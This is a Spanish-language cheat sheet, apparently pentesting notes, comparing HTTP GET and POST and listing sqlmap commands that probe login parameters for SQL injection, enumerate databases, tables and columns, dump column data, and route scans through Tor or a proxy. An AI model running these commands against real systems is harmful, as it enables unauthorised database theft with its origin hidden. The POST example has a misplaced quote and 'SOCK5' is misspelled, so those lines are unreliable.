# Métodos HTTP: GET vs POST

| **GET**                                                                                       | **POST**                                                                        |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| Solicita los datos de un servidor.                                                            | Envia datos al servidor, a menudo datos de un formulario.                       |
| Datos enviados en la **URL** de la solicitud.                                                 | Datos se envían en el **cuerpo** de la solicitud **HTTP**.                      |
| Parámetros visibles en la **URL** del navegador.                                              | Parámetros **no** visibles en la **URL**  del navegador.                        |
| Solicitud limitada por la longitud máxima de la **URL.** Varía según el navegador y servidor. | No hay limitación de tamaño en los datos enviados en el cuerpo de la solicitud. |
**EJEMPLO GET:** `http://www.example.com/index.php?username=user&password=pass123`

**EJEMPLO POST:** 
```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=user&password=pass123
```
# GET Request con SQLMap:

- Se analiza **user=admin** y **pass=admin** en la **URL** para detectar posibles inyecciones **SQL**.
```bash
sqlmap -u 'http://www.example.com/login.php?user=admin&pass=admin'
```
# POST Request con SQLMap:

- Se analiza  **user=admin** y **pass=admin** en el **cuerpo** de la solicitud para detectar posible SQLi.
```bash
sqlmap -u 'http://www.example.com/login.php --data 'user=admin&pass=admin'
```
# Solicitud HTTP con SQLMap

# Comandos básicos de la herramienta SQLMap
#### Data base
- Devuelve todas las bases de datos
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln --dbs --tamper=space2comment
```
#### Tabla
- Devuelve las tablas de una DB específica
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name --tables
```
#### Columnas
- Devuelve las columnas de una DB y tabla específica
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name --columns
```
#### Datos
- Devuelve los DATOS de una columna específica
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name  --dump -C name,name,name
```
---
# Usar TOR con SQLMap
```bash
sqlmap -u 'http://www.example.com' --tor --tor-type=SOCK5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```
# Usar un PROXY con SQLMap
```bash
sqlmap -u 'http://www.example.com' --proxy='https://127.0.0.1:8080'
```
